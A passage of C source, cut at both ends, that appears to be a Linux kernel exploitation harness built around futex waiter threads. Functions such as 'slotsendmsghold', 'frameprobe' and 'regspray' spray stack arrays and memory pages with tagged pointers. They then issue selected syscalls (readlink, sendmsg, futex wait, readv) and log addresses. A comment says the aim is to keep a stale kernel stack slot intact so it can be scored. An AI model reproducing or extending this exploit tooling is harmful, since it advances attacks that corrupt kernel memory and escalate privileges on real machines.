    if (slotsearch_init_region() != 0) {
        return -1;
    }

    uint8_t *tag = (uint8_t *)slotsearch_region +
                   ((iter % SLOTSEARCH_PAGES) * SLOTSEARCH_PAGE_SIZE);
    uintptr_t tag_value = (uintptr_t)tag;

    for (size_t i = 0; i < sizeof(spray) / sizeof(spray[0]); i++) {
        spray[i] = tag_value;
    }

    memset(tag, 0x4c, SLOTSEARCH_PAGE_SIZE);
    memcpy(tag + 128, &tag_value, sizeof(tag_value));

    if (mprotect(tag, SLOTSEARCH_PAGE_SIZE, PROT_READ | PROT_WRITE) != 0) {
        failures++;
    }
    if (madvise(tag, SLOTSEARCH_PAGE_SIZE, MADV_NORMAL) != 0) {
        failures++;
    }
    if (mincore(tag, SLOTSEARCH_PAGE_SIZE, mincore_vec) != 0) {
        failures++;
    }

    if (readlink("/proc/self/exe", (char *)tag, 96) < 0) {
        failures++;
    }

    struct timespec *ts = (struct timespec *)tag;
    ts->tv_sec = 0;
    ts->tv_nsec = 1000;
    if (clock_gettime(CLOCK_MONOTONIC, ts) != 0) {
        failures++;
    }
    ts->tv_sec = 0;
    ts->tv_nsec = 1000;
    if (nanosleep(ts, NULL) != 0 && errno != EINTR) {
        failures++;
    }

    (void)xfutex((uint32_t *)tag, F_WAKE, 1, NULL, NULL, 0);

    if (waiter_churn_fd_count + 2 >
        sizeof(waiter_churn_fds) / sizeof(waiter_churn_fds[0])) {
        errno = EMFILE;
        return -1;
    }

    int sp[2] = {-1, -1};
    if (socketpair(AF_UNIX, SOCK_DGRAM | SOCK_CLOEXEC | SOCK_NONBLOCK, 0, sp) != 0) {
        return -1;
    }
    if (waiter_churn_remember_fd_no_close(sp[0]) != 0 ||
        waiter_churn_remember_fd_no_close(sp[1]) != 0) {
        return -1;
    }

    struct iovec iov[8];
    for (size_t i = 0; i < sizeof(iov) / sizeof(iov[0]); i++) {
        iov[i].iov_base = tag;
        iov[i].iov_len = 32;
    }
    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_iov = iov;
    msg.msg_iovlen = sizeof(iov) / sizeof(iov[0]);

    if (slotsearch_should_log(iter)) {
        printf("[W] slotsearchlast pre-send iter=%ld tid=%ld tag=%p tag_value=0x%016llx spray0=0x%016llx spray63=0x%016llx mincore_vec=%p vec0=0x%02x fds=%d,%d failures_addr=%p failures=%d next_syscall=sendmsg\n",
               iter, gettid_long(), tag, (unsigned long long)tag_value,
               (unsigned long long)spray[0],
               (unsigned long long)spray[63],
               mincore_vec, mincore_vec[0], sp[0], sp[1],
               &failures, failures);
        fflush(stdout);
    }

    if (sendmsg(sp[0], &msg, 0) < 0) {
        failures++;
    }

    asm volatile("" : : "r"(spray), "r"(tag), "r"(mincore_vec) : "memory");

    return failures == 0 ? 0 : -1;
}

static int waiter_churn_slotreadlinklast_syscall(long iter)
{
    volatile uintptr_t spray[64];
    uint8_t mincore_vec[1] = {0};
    int failures = 0;

    if (slotsearch_init_region() != 0) {
        return -1;
    }

    uint8_t *tag = (uint8_t *)slotsearch_region +
                   ((iter % SLOTSEARCH_PAGES) * SLOTSEARCH_PAGE_SIZE);
    uintptr_t tag_value = (uintptr_t)tag;

    for (size_t i = 0; i < sizeof(spray) / sizeof(spray[0]); i++) {
        spray[i] = tag_value;
    }

    memset(tag, 0x52, SLOTSEARCH_PAGE_SIZE);
    memcpy(tag + 128, &tag_value, sizeof(tag_value));

    if (mprotect(tag, SLOTSEARCH_PAGE_SIZE, PROT_READ | PROT_WRITE) != 0) {
        failures++;
    }
    if (madvise(tag, SLOTSEARCH_PAGE_SIZE, MADV_NORMAL) != 0) {
        failures++;
    }
    if (mincore(tag, SLOTSEARCH_PAGE_SIZE, mincore_vec) != 0) {
        failures++;
    }

    if (slotsearch_should_log(iter)) {
        printf("[W] slotreadlinklast pre-readlink iter=%ld tid=%ld tag=%p tag_value=0x%016llx spray0=0x%016llx spray63=0x%016llx mincore_vec=%p vec0=0x%02x failures_addr=%p failures=%d next_syscall=readlink\n",
               iter, gettid_long(), tag, (unsigned long long)tag_value,
               (unsigned long long)spray[0],
               (unsigned long long)spray[63],
               mincore_vec, mincore_vec[0], &failures, failures);
        fflush(stdout);
    }

    if (readlink("/proc/self/exe", (char *)tag, 96) < 0) {
        failures++;
    }

    asm volatile("" : : "r"(spray), "r"(tag), "r"(mincore_vec) : "memory");

    return failures == 0 ? 0 : -1;
}

static int waiter_churn_slotfutexwaithold_syscall(long iter)
{
    volatile uintptr_t spray[64];
    uint8_t mincore_vec[1] = {0};
    int failures = 0;

    if (slotsearch_init_region() != 0) {
        return -1;
    }

    uint8_t *tag = (uint8_t *)slotsearch_region +
                   ((iter % SLOTSEARCH_PAGES) * SLOTSEARCH_PAGE_SIZE);
    uintptr_t tag_value = (uintptr_t)tag;

    for (size_t i = 0; i < sizeof(spray) / sizeof(spray[0]); i++) {
        spray[i] = tag_value;
    }

    memset(tag, 0x46, SLOTSEARCH_PAGE_SIZE);
    *(uint32_t *)tag = 0;
    memcpy(tag + 128, &tag_value, sizeof(tag_value));

    if (mprotect(tag, SLOTSEARCH_PAGE_SIZE, PROT_READ | PROT_WRITE) != 0) {
        failures++;
    }
    if (madvise(tag, SLOTSEARCH_PAGE_SIZE, MADV_NORMAL) != 0) {
        failures++;
    }
    if (mincore(tag, SLOTSEARCH_PAGE_SIZE, mincore_vec) != 0) {
        failures++;
    }

    if (slotsearch_should_log(iter)) {
        printf("[W] slotfutexwaithold pre-futexwait iter=%ld tid=%ld tag=%p tag_value=0x%016llx spray0=0x%016llx spray63=0x%016llx futex_word=0x%08x mincore_vec=%p vec0=0x%02x failures_addr=%p failures=%d next_syscall=futex_wait\n",
               iter, gettid_long(), tag, (unsigned long long)tag_value,
               (unsigned long long)spray[0],
               (unsigned long long)spray[63],
               *(uint32_t *)tag, mincore_vec, mincore_vec[0],
               &failures, failures);
        fflush(stdout);
    }

    if (waiter_churn_progress_mode > 0 &&
        chainwalk_at_churn_iter > 0 &&
        iter + 1 >= chainwalk_at_churn_iter) {
        __atomic_store_n(&waiter_active_hold_started, 1, __ATOMIC_RELEASE);
        __atomic_store_n(&waiter_churn_progress, iter + 1, __ATOMIC_RELEASE);
    }

    struct timespec hold_timeout = {
        .tv_sec = waiter_hold_ms / 1000,
        .tv_nsec = (waiter_hold_ms % 1000) * 1000000L,
    };
    long ret = xfutex((uint32_t *)tag, F_WAIT, 0, &hold_timeout, NULL, 0);
    int err = errno;
    if (!(ret == -1 && (err == ETIMEDOUT || err == EINTR))) {
        failures++;
    }
    print_ret("[W] slotfutexwaithold FUTEX_WAIT(tag)", ret, err);

    asm volatile("" : : "r"(spray), "r"(tag), "r"(mincore_vec) : "memory");

    return failures == 0 ? 0 : -1;
}

static int waiter_churn_slotsendmsghold_syscall(long iter)
{
    volatile uintptr_t spray[64];
    uint8_t mincore_vec[1] = {0};
    char fill[1024];
    int failures = 0;
    int sp[2] = {-1, -1};
    long filled = 0;
    int filled_to_eagain = 0;

    if (slotsearch_init_region() != 0) {
        return -1;
    }

    uint8_t *tag = (uint8_t *)slotsearch_region +
                   ((iter % SLOTSEARCH_PAGES) * SLOTSEARCH_PAGE_SIZE);
    uintptr_t tag_value = (uintptr_t)tag;
    int is_target = waiter_churn_progress_mode > 0 &&
                    chainwalk_at_churn_iter > 0 &&
                    iter + 1 >= chainwalk_at_churn_iter;

    for (size_t i = 0; i < sizeof(spray) / sizeof(spray[0]); i++) {
        spray[i] = tag_value;
    }

    memset(tag, 0x48, SLOTSEARCH_PAGE_SIZE);
    memcpy(tag + 128, &tag_value, sizeof(tag_value));
    memset(fill, 0x68, sizeof(fill));

    if (mprotect(tag, SLOTSEARCH_PAGE_SIZE, PROT_READ | PROT_WRITE) != 0) {
        failures++;
    }
    if (madvise(tag, SLOTSEARCH_PAGE_SIZE, MADV_NORMAL) != 0) {
        failures++;
    }
    if (mincore(tag, SLOTSEARCH_PAGE_SIZE, mincore_vec) != 0) {
        failures++;
    }

    if (socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, sp) != 0) {
        return -1;
    }
    if (waiter_churn_remember_fd_no_close(sp[0]) != 0 ||
        waiter_churn_remember_fd_no_close(sp[1]) != 0) {
        return -1;
    }

    int sndbuf = 4096;
    if (setsockopt(sp[0], SOL_SOCKET, SO_SNDBUF,
                   &sndbuf, sizeof(sndbuf)) != 0) {
        failures++;
    }
    struct timeval tv = {
        .tv_sec = waiter_hold_ms / 1000,
        .tv_usec = (waiter_hold_ms % 1000) * 1000,
    };
    if (setsockopt(sp[0], SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv)) != 0) {
        failures++;
    }

    for (int i = 0; i < 1024; i++) {
        ssize_t n = send(sp[0], fill, sizeof(fill), MSG_DONTWAIT);
        if (n > 0) {
            filled += n;
            continue;
        }
        if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
            filled_to_eagain = 1;
            break;
        }
        failures++;
        break;
    }
    if (!filled_to_eagain) {
        failures++;
    }

    struct iovec iov[8];
    for (size_t i = 0; i < sizeof(iov) / sizeof(iov[0]); i++) {
        iov[i].iov_base = tag;
        iov[i].iov_len = 1024;
    }
    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_iov = iov;
    msg.msg_iovlen = sizeof(iov) / sizeof(iov[0]);

    if (slotsearch_should_log(iter)) {
        printf("[W] slotsendmsghold pre-sendmsg iter=%ld tid=%ld tag=%p tag_value=0x%016llx spray0=0x%016llx spray63=0x%016llx filled=%ld filled_to_eagain=%d mincore_vec=%p vec0=0x%02x fds=%d,%d failures_addr=%p failures=%d next_syscall=sendmsg_blocking\n",
               iter, gettid_long(), tag, (unsigned long long)tag_value,
               (unsigned long long)spray[0],
               (unsigned long long)spray[63],
               filled, filled_to_eagain, mincore_vec, mincore_vec[0],
               sp[0], sp[1], &failures, failures);
        fflush(stdout);
    }

    if (is_target) {
        __atomic_store_n(&waiter_active_hold_started, 1, __ATOMIC_RELEASE);
        __atomic_store_n(&waiter_churn_progress, iter + 1, __ATOMIC_RELEASE);
    }

    ssize_t sent = sendmsg(sp[0], &msg, is_target ? 0 : MSG_DONTWAIT);
    int err = errno;
    if (is_target) {
        if (!(sent < 0 && (err == EAGAIN || err == EWOULDBLOCK || err == EINTR))) {
            failures++;
        }
    } else if (sent < 0 && !(err == EAGAIN || err == EWOULDBLOCK)) {
        failures++;
    }
    if (sent < 0) {
        print_ret("[W] slotsendmsghold sendmsg(tag_iov)", -1, err);
    } else {
        printf("[W] slotsendmsghold sendmsg(tag_iov) ret=%zd errno=0 (OK)\n",
               sent);
        fflush(stdout);
    }

    asm volatile("" : : "r"(spray), "r"(tag), "r"(mincore_vec) : "memory");

    return failures == 0 ? 0 : -1;
}

static int frameprobe_case_is(const char *name)
{
    return strcmp(frameprobe_case, name) == 0;
}

static int frameprobe_case_valid(void)
{
    return frameprobe_case_is("readlink") ||
           frameprobe_case_is("clock") ||
           frameprobe_case_is("nanosleep") ||
           frameprobe_case_is("futexwake") ||
           frameprobe_case_is("futexwait") ||
           frameprobe_case_is("futexwait-args") ||
           frameprobe_case_is("read") ||
           frameprobe_case_is("write") ||
           frameprobe_case_is("readv") ||
           frameprobe_case_is("writev") ||
           frameprobe_case_is("ioctl-fionread") ||
           frameprobe_case_is("sendmsg") ||
           frameprobe_case_is("recvmsg") ||
           frameprobe_case_is("sendmsg-block") ||
           frameprobe_case_is("ppoll") ||
           frameprobe_case_is("prctl-name");
}

static int frameprobe_case_is_blocking(void)
{
    return frameprobe_case_is("futexwait") ||
           frameprobe_case_is("futexwait-args") ||
           frameprobe_case_is("sendmsg-block");
}

static int frameprobe_hold_pipe_fds(int fds[2])
{
    if (waiter_churn_fd_count + 2 >
        sizeof(waiter_churn_fds) / sizeof(waiter_churn_fds[0])) {
        errno = EMFILE;
        return -1;
    }
    if (waiter_churn_remember_fd_no_close(fds[0]) != 0 ||
        waiter_churn_remember_fd_no_close(fds[1]) != 0) {
        return -1;
    }
    return 0;
}

static int frameprobe_prepare_pipe(int fds[2])
{
    if (pipe2(fds, O_CLOEXEC | O_NONBLOCK) != 0) {
        return -1;
    }
    if (frameprobe_hold_pipe_fds(fds) != 0) {
        int saved_errno = errno;
        close(fds[0]);
        close(fds[1]);
        errno = saved_errno;
        return -1;
    }
    return 0;
}

static int frameprobe_prepare_socketpair(int sp[2], int type)
{
    if (socketpair(AF_UNIX, type | SOCK_CLOEXEC, 0, sp) != 0) {
        return -1;
    }
    if (frameprobe_hold_pipe_fds(sp) != 0) {
        int saved_errno = errno;
        close(sp[0]);
        close(sp[1]);
        errno = saved_errno;
        return -1;
    }
    return 0;
}

static void frameprobe_publish_target_progress(long iter)
{
    __atomic_store_n(&waiter_active_hold_started, 1, __ATOMIC_RELEASE);
    __atomic_store_n(&waiter_churn_progress, iter + 1, __ATOMIC_RELEASE);
}

static int waiter_churn_frameprobe_syscall(long iter)
{
    volatile uintptr_t spray[64];
    uint8_t mincore_vec[1] = {0};
    char fill[1024];
    int failures = 0;
    int is_target = waiter_churn_progress_mode > 0 &&
                    chainwalk_at_churn_iter > 0 &&
                    iter + 1 >= chainwalk_at_churn_iter;

    if (slotsearch_init_region() != 0) {
        return -1;
    }

    uint8_t *tag = (uint8_t *)slotsearch_region +
                   ((iter % SLOTSEARCH_PAGES) * SLOTSEARCH_PAGE_SIZE);
    uintptr_t tag_value = (uintptr_t)tag;

    for (size_t i = 0; i < sizeof(spray) / sizeof(spray[0]); i++) {
        spray[i] = tag_value;
    }

    memset(tag, 0x70 ^ (int)(iter & 0x0f), SLOTSEARCH_PAGE_SIZE);
    memcpy(tag + 128, &tag_value, sizeof(tag_value));
    memset(fill, 0x6b, sizeof(fill));

    if (mprotect(tag, SLOTSEARCH_PAGE_SIZE, PROT_READ | PROT_WRITE) != 0) {
        failures++;
    }
    if (madvise(tag, SLOTSEARCH_PAGE_SIZE, MADV_NORMAL) != 0) {
        failures++;
    }
    if (mincore(tag, SLOTSEARCH_PAGE_SIZE, mincore_vec) != 0) {
        failures++;
    }

    if (slotsearch_should_log(iter)) {
        printf("[W] frameprobe pre iter=%ld tid=%ld case=%s tag=%p tag_value=0x%016llx spray0=0x%016llx spray63=0x%016llx mincore_vec=%p vec0=0x%02x failures_addr=%p failures=%d blocking=%d target=%d next_syscall=%s\n",
               iter, gettid_long(), frameprobe_case, tag,
               (unsigned long long)tag_value,
               (unsigned long long)spray[0],
               (unsigned long long)spray[63],
               mincore_vec, mincore_vec[0], &failures, failures,
               frameprobe_case_is_blocking(), is_target, frameprobe_case);
        fflush(stdout);
    }

    if ((frameprobe_case_is("futexwait") ||
         frameprobe_case_is("futexwait-args")) &&
        is_target) {
        frameprobe_publish_target_progress(iter);
    }

    if (frameprobe_case_is("readlink")) {
        if (readlink("/proc/self/exe", (char *)tag, 96) < 0) {
            failures++;
        }
    } else if (frameprobe_case_is("clock")) {
        if (clock_gettime(CLOCK_MONOTONIC, (struct timespec *)tag) != 0) {
            failures++;
        }
    } else if (frameprobe_case_is("nanosleep")) {
        struct timespec *ts = (struct timespec *)tag;
        ts->tv_sec = 0;
        ts->tv_nsec = 1000;
        if (nanosleep(ts, NULL) != 0 && errno != EINTR) {
            failures++;
        }
    } else if (frameprobe_case_is("futexwake")) {
        *(uint32_t *)tag = 0;
        (void)xfutex((uint32_t *)tag, F_WAKE, 1, NULL, NULL, 0);
    } else if (frameprobe_case_is("futexwait")) {
        *(uint32_t *)tag = 0;
        struct timespec hold_timeout = {
            .tv_sec = waiter_hold_ms / 1000,
            .tv_nsec = (waiter_hold_ms % 1000) * 1000000L,
        };
        long ret = xfutex((uint32_t *)tag, F_WAIT, 0, &hold_timeout, NULL, 0);
        int err = errno;
        if (!(ret == -1 && (err == ETIMEDOUT || err == EINTR))) {
            failures++;
        }
        print_ret("[W] frameprobe FUTEX_WAIT(tag)", ret, err);
    } else if (frameprobe_case_is("futexwait-args")) {
        uint32_t *uaddr = (uint32_t *)tag;
        struct timespec *hold_timeout =
            (struct timespec *)(void *)(tag + 0x40);
        uint32_t *uaddr2 = (uint32_t *)(void *)(tag + 0x80);
        uint64_t arg5_val3 = regspray_value;
        long ret;
        int raw_err = 0;

        *uaddr = 0;
        *uaddr2 = 0x43495645U;
        hold_timeout->tv_sec = waiter_hold_ms / 1000;
        hold_timeout->tv_nsec = (waiter_hold_ms % 1000) * 1000000L;

        printf("[W] frameprobe futexwait-args iter=%ld tid=%ld arg0_uaddr=%p arg1_op=0x%x arg2_val=0x%x arg3_timeout=%p arg4_uaddr2=%p arg5_val3=0x%016llx timeout_sec=%ld timeout_nsec=%ld uaddr_word=0x%08x uaddr2_word=0x%08x\n",
               iter, gettid_long(), (void *)uaddr, F_WAIT, 0,
               (void *)hold_timeout, (void *)uaddr2,
               (unsigned long long)arg5_val3,
               (long)hold_timeout->tv_sec, hold_timeout->tv_nsec,
               *uaddr, *uaddr2);
        fflush(stdout);

        ret = raw_syscall6(SYS_futex,
                           (uint64_t)(uintptr_t)uaddr,
                           (uint64_t)F_WAIT,
                           0,
                           (uint64_t)(uintptr_t)hold_timeout,
                           (uint64_t)(uintptr_t)uaddr2,
                           arg5_val3);
        if (ret < 0 && ret >= -4095) {
            raw_err = (int)-ret;
        }
        if (!(raw_err == ETIMEDOUT || raw_err == EINTR)) {
            failures++;
        }
        printf("[W] frameprobe FUTEX_WAIT(args) raw_ret=%ld raw_errno=%d (%s)\n",
               ret, raw_err, raw_err ? strerror(raw_err) : "OK");
        fflush(stdout);
    } else if (frameprobe_case_is("read") ||
               frameprobe_case_is("write") ||
               frameprobe_case_is("readv") ||
               frameprobe_case_is("writev") ||
               frameprobe_case_is("ioctl-fionread")) {
        int fds[2] = {-1, -1};
        if (frameprobe_prepare_pipe(fds) != 0) {
            failures++;
        } else if (frameprobe_case_is("read")) {
            (void)write(fds[1], fill, 64);
            if (read(fds[0], tag, 64) < 0) {
                failures++;
            }
        } else if (frameprobe_case_is("write")) {
            if (write(fds[1], tag, 64) < 0) {
                failures++;
            }
        } else if (frameprobe_case_is("readv")) {
            struct iovec iov[4];
            (void)write(fds[1], fill, 256);
            for (size_t i = 0; i < sizeof(iov) / sizeof(iov[0]); i++) {
                iov[i].iov_base = tag + (i * 64);
                iov[i].iov_len = 64;
            }
            if (readv(fds[0], iov, sizeof(iov) / sizeof(iov[0])) < 0) {
                failures++;
            }
        } else if (frameprobe_case_is("writev")) {
            struct iovec iov[4];
            for (size_t i = 0; i < sizeof(iov) / sizeof(iov[0]); i++) {
                iov[i].iov_base = tag + (i * 64);
                iov[i].iov_len = 64;
            }
            if (writev(fds[1], iov, sizeof(iov) / sizeof(iov[0])) < 0) {
                failures++;
            }
        } else if (frameprobe_case_is("ioctl-fionread")) {
            (void)write(fds[1], fill, 17);
            if (ioctl(fds[0], FIONREAD, (int *)tag) != 0) {
                failures++;
            }
        }
    } else if (frameprobe_case_is("sendmsg") ||
               frameprobe_case_is("recvmsg") ||
               frameprobe_case_is("sendmsg-block")) {
        int type = frameprobe_case_is("sendmsg-block") ?
                   SOCK_STREAM : (SOCK_DGRAM | SOCK_NONBLOCK);
        int sp[2] = {-1, -1};
        if (frameprobe_prepare_socketpair(sp, type) != 0) {
            failures++;
        } else {
            struct iovec iov[4];
            struct msghdr msg;
            for (size_t i = 0; i < sizeof(iov) / sizeof(iov[0]); i++) {
                iov[i].iov_base = tag + (i * 64);
                iov[i].iov_len = frameprobe_case_is("sendmsg-block") ? 1024 : 64;
            }
            memset(&msg, 0, sizeof(msg));
            msg.msg_iov = iov;
            msg.msg_iovlen = sizeof(iov) / sizeof(iov[0]);

            if (frameprobe_case_is("recvmsg")) {
                if (send(sp[0], fill, 128, MSG_DONTWAIT) < 0 ||
                    recvmsg(sp[1], &msg, MSG_DONTWAIT) < 0) {
                    failures++;
                }
            } else if (frameprobe_case_is("sendmsg-block")) {
                int sndbuf = 4096;
                struct timeval tv = {
                    .tv_sec = waiter_hold_ms / 1000,
                    .tv_usec = (waiter_hold_ms % 1000) * 1000,
                };
                (void)setsockopt(sp[0], SOL_SOCKET, SO_SNDBUF,
                                 &sndbuf, sizeof(sndbuf));
                (void)setsockopt(sp[0], SOL_SOCKET, SO_SNDTIMEO,
                                 &tv, sizeof(tv));
                for (int i = 0; i < 1024; i++) {
                    ssize_t n = send(sp[0], fill, sizeof(fill), MSG_DONTWAIT);
                    if (n < 0 && (errno == EAGAIN || errno == EWOULDBLOCK)) {
                        break;
                    }
                    if (n < 0) {
                        failures++;
                        break;
                    }
                }
                if (is_target) {
                    frameprobe_publish_target_progress(iter);
                }
                ssize_t sent = sendmsg(sp[0], &msg, is_target ? 0 : MSG_DONTWAIT);
                int err = errno;
                if (sent < 0 &&
                    !(err == EAGAIN || err == EWOULDBLOCK || err == EINTR)) {
                    failures++;
                }
                if (sent < 0) {
                    print_ret("[W] frameprobe sendmsg-block(tag_iov)", -1, err);
                } else {
                    printf("[W] frameprobe sendmsg-block(tag_iov) ret=%zd errno=0 (OK)\n",
                           sent);
                    fflush(stdout);
                }
            } else {
                if (sendmsg(sp[0], &msg, MSG_DONTWAIT) < 0) {
                    failures++;
                }
            }
        }
    } else if (frameprobe_case_is("ppoll")) {
        struct pollfd *pfd = (struct pollfd *)tag;
        struct timespec ts = {
            .tv_sec = 0,
            .tv_nsec = 1000,
        };
        pfd[0].fd = -1;
        pfd[0].events = POLLIN;
        pfd[0].revents = 0;
        if (ppoll(pfd, 1, &ts, NULL) < 0 && errno != EINTR) {
            failures++;
        }
    } else if (frameprobe_case_is("prctl-name")) {
        memcpy(tag, "wlframeprobe", 13);
        if (prctl(PR_SET_NAME, (unsigned long)tag, 0, 0, 0) != 0) {
            failures++;
        }
    } else {
        failures++;
    }

    if (slotsearch_should_log(iter)) {
        uint64_t tag0 = 0;
        uint64_t tag16 = 0;
        memcpy(&tag0, tag, sizeof(tag0));
        memcpy(&tag16, tag + 16, sizeof(tag16));
        printf("[W] frameprobe post iter=%ld tid=%ld case=%s tag=%p tag0=0x%016llx tag16=0x%016llx failures=%d\n",
               iter, gettid_long(), frameprobe_case, tag,
               (unsigned long long)tag0,
               (unsigned long long)tag16, failures);
        fflush(stdout);
    }

    asm volatile("" : : "r"(spray), "r"(tag), "r"(mincore_vec) : "memory");

    return failures == 0 ? 0 : -1;
}

static int waiter_churn_mode_is(const char *name)
{
    return strcmp(waiter_churn_mode, name) == 0;
}

static int waiter_churn_mode_is_slotlast(void)
{
    return waiter_churn_mode_is("stack") ||
           waiter_churn_mode_is("stackshape") ||
           waiter_churn_mode_is("slotsearchlast") ||
           waiter_churn_mode_is("slotreadlinklast") ||
           waiter_churn_mode_is("regspray") ||
           waiter_churn_mode_is("regsprayclean") ||
           (waiter_churn_mode_is("frameprobe") &&
            !frameprobe_case_is_blocking());
}

static int waiter_churn_mode_is_blocking_slotlast(void)
{
    return waiter_churn_mode_is("slotfutexwaithold") ||
           waiter_churn_mode_is("slotsendmsghold") ||
           (waiter_churn_mode_is("frameprobe") &&
            frameprobe_case_is_blocking());
}

static int waiter_post_return_mode_is(const char *name)
{
    return strcmp(waiter_post_return_mode, name) == 0;
}

static int waiter_isolated_hold_mode_is(const char *name)
{
    return strcmp(waiter_isolated_hold_mode, name) == 0;
}

static int waiter_post_return_isolated(void)
{
    return !waiter_post_return_mode_is("normal");
}

static int waiter_churn_mode_valid(void)
{
    return waiter_churn_mode_is("none") ||
           waiter_churn_mode_is("syscall") ||
           waiter_churn_mode_is("stack") ||
           waiter_churn_mode_is("stackshape") ||
           waiter_churn_mode_is("fd") ||
           waiter_churn_mode_is("mix") ||
           waiter_churn_mode_is("memfd") ||
           waiter_churn_mode_is("pipe") ||
           waiter_churn_mode_is("epoll") ||
           waiter_churn_mode_is("unix") ||
           waiter_churn_mode_is("slotsearch") ||
           waiter_churn_mode_is("slotsearchlast") ||
           waiter_churn_mode_is("slotreadlinklast") ||
           waiter_churn_mode_is("slotfutexwaithold") ||
           waiter_churn_mode_is("slotsendmsghold") ||
           waiter_churn_mode_is("frameprobe") ||
           waiter_churn_mode_is("regspray") ||
           waiter_churn_mode_is("regsprayclean") ||
           waiter_churn_mode_is("pressure");
}

static int waiter_post_return_mode_valid(void)
{
    return waiter_post_return_mode_is("normal") ||
           waiter_post_return_mode_is("quietspin") ||
           waiter_post_return_mode_is("write") ||
           waiter_post_return_mode_is("yield") ||
           waiter_post_return_mode_is("gettid") ||
           waiter_post_return_mode_is("clock") ||
           waiter_post_return_mode_is("nanosleep") ||
           waiter_post_return_mode_is("futexwake") ||
           waiter_post_return_mode_is("readlink") ||
           waiter_post_return_mode_is("readv-small") ||
           waiter_post_return_mode_is("readv-large") ||
           waiter_post_return_mode_is("readv-block-small") ||
           waiter_post_return_mode_is("readv-block-large") ||
           waiter_post_return_mode_is("preadv-socket") ||
           waiter_post_return_mode_is("pwritev2-socket") ||
           waiter_post_return_mode_is("epoll-block") ||
           waiter_post_return_mode_is("sendmsg-block") ||
           waiter_post_return_mode_is("sendmmsg-block") ||
           waiter_post_return_mode_is("sendmmsg-name-block") ||
           waiter_post_return_mode_is("sigsuspend-block") ||
           waiter_post_return_mode_is("io-submit-usercopy") ||
           waiter_post_return_mode_is("pipe-read-io-submit") ||
           waiter_post_return_mode_is("process-vm-readv") ||
           waiter_post_return_mode_is("process-vm-writev") ||
           waiter_post_return_mode_is("sched-affinity") ||
           waiter_post_return_mode_is("sched-affinity-loop") ||
           waiter_post_return_mode_is("seccomperrno") ||
           waiter_post_return_mode_is("seccomplog") ||
           waiter_post_return_mode_is("seccompallowmark");
}

static int waiter_isolated_hold_mode_valid(void)
{
    return waiter_isolated_hold_mode_is("busy") ||
           waiter_isolated_hold_mode_is("getpidloop") ||
           waiter_isolated_hold_mode_is("getuidloop") ||
           waiter_isolated_hold_mode_is("iosubmitloop") ||
           waiter_isolated_hold_mode_is("iosubmitcowloop") ||
           waiter_isolated_hold_mode_is("usleep") ||
           waiter_isolated_hold_mode_is("futexwaittag") ||
           waiter_isolated_hold_mode_is("readv-block-small") ||
           waiter_isolated_hold_mode_is("readv-block-large") ||
           waiter_isolated_hold_mode_is("epoll-block") ||
           waiter_isolated_hold_mode_is("sendmsg-block") ||
           waiter_isolated_hold_mode_is("sendmmsg-block") ||
           waiter_isolated_hold_mode_is("sendmmsg-name-block") ||
           waiter_isolated_hold_mode_is("sigsuspend-block") ||
           waiter_isolated_hold_mode_is("seccompgetppid") ||
           waiter_isolated_hold_mode_is("seccompgetppidlog") ||
           waiter_isolated_hold_mode_is("seccompgetppidallowmark");
}

static int waiter_isolated_hold_mode_is_block_probe(void)
{
    return waiter_isolated_hold_mode_is("readv-block-small") ||
           waiter_isolated_hold_mode_is("readv-block-large") ||
           waiter_isolated_hold_mode_is("epoll-block") ||
           waiter_isolated_hold_mode_is("sendmsg-block") ||
           waiter_isolated_hold_mode_is("sendmmsg-block") ||
           waiter_isolated_hold_mode_is("sendmmsg-name-block") ||
           waiter_isolated_hold_mode_is("sigsuspend-block");
}

static int install_waiter_seccomp_getppid_filter(unsigned int action,
                                                 const char *action_name,
                                                 unsigned int marker)
{
    struct sock_filter filter[] = {
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
                 (unsigned int)offsetof(struct seccomp_data, nr)),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, SYS_getppid, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, action),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
    };
    struct sock_fprog prog = {
        .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),
        .filter = filter,
    };

    if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) != 0) {
        printf("[W] seccomp no_new_privs failed errno=%d (%s)\n",
               errno, strerror(errno));
        fflush(stdout);
        return -1;
    }
    if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog) != 0) {
        printf("[W] seccomp filter install failed errno=%d (%s)\n",
               errno, strerror(errno));
        fflush(stdout);
        return -1;
    }

    printf("[W] seccomp %s filter installed syscall=getppid action=0x%08x marker=0x%04x allow=0x%08x\n",
           action_name, action, marker, SECCOMP_RET_ALLOW);
    fflush(stdout);
    return 0;
}

static int install_waiter_seccomp_errno_filter(void)
{
    return install_waiter_seccomp_getppid_filter(SECCOMP_ERRNO_ACTION,
                                                 "errno",
                                                 SECCOMP_ERRNO_MARKER);
}

static int install_waiter_seccomp_log_filter(void)
{
    return install_waiter_seccomp_getppid_filter(SECCOMP_LOG_ACTION,
                                                 "log",
                                                 SECCOMP_LOG_MARKER);
}

static int install_waiter_seccomp_allowmark_filter(void)
{
    return install_waiter_seccomp_getppid_filter(SECCOMP_ALLOW_MARKED_ACTION,
                                                 "allowmark",
                                                 SECCOMP_ALLOW_MARKER);
}

static int waiter_post_return_readv_probe(int large_iov)
{
    enum {
        small_vlen = 4,
        large_vlen = 9,
        chunk_len = 64,
    };
    int fds[2] = {-1, -1};
    unsigned char fill[large_vlen * chunk_len];
    unsigned char sink[large_vlen * chunk_len];
    struct iovec iov[large_vlen];
    int vlen = large_iov ? large_vlen : small_vlen;
    size_t total = (size_t)vlen * chunk_len;
    ssize_t n;
    int saved_errno;

    /*
     * Keep readv as the final W-side syscall before the chainwalk gate. On
     * success, do not close or print here: either would run another syscall and
     * likely overwrite the stale kernel stack slot we are trying to score.
     */
    if (pipe2(fds, O_CLOEXEC) != 0) {
        return -1;
    }

    memset(fill, large_iov ? 0x52 : 0x72, sizeof(fill));
    memset(sink, 0, sizeof(sink));
    for (int i = 0; i < vlen; i++) {
        iov[i].iov_base = sink + ((size_t)i * chunk_len);
        iov[i].iov_len = chunk_len;
    }

    n = write(fds[1], fill, total);
